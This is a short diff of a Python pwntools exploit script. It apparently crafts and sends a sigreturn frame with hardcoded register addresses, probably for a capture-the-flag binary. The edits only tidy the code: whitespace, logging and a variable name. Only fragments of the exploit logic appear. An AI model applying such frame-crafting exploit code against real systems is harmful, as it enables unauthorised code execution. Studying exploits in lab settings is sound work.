@@ -1,4 +1,4 @@
-#!/usr/bin/env python3                                                          
+#!/usr/bin/env python3
 import struct
 from pwn import *
 
@@ -117,8 +117,8 @@ def send_frame():
     frame.rbp = 0x00007ffffffe7008
     frame.rip = 0x000000000040119f
 
-    info = [frame[i:i+8] for i in range(0, len(frame), 8)]
-    print (info)
+    info_split = [frame[i:i+8] for i in range(0, len(frame), 8)]
+    log.info(info_split)
     p.recv(timeout=0.1)
     p.send(frame)
     p.clean(timeout=0.1)
@@ -307,5 +307,9 @@ def create_frame():
 if __name__ == '__main__':
     
     main()
+
+
+
+
 
 
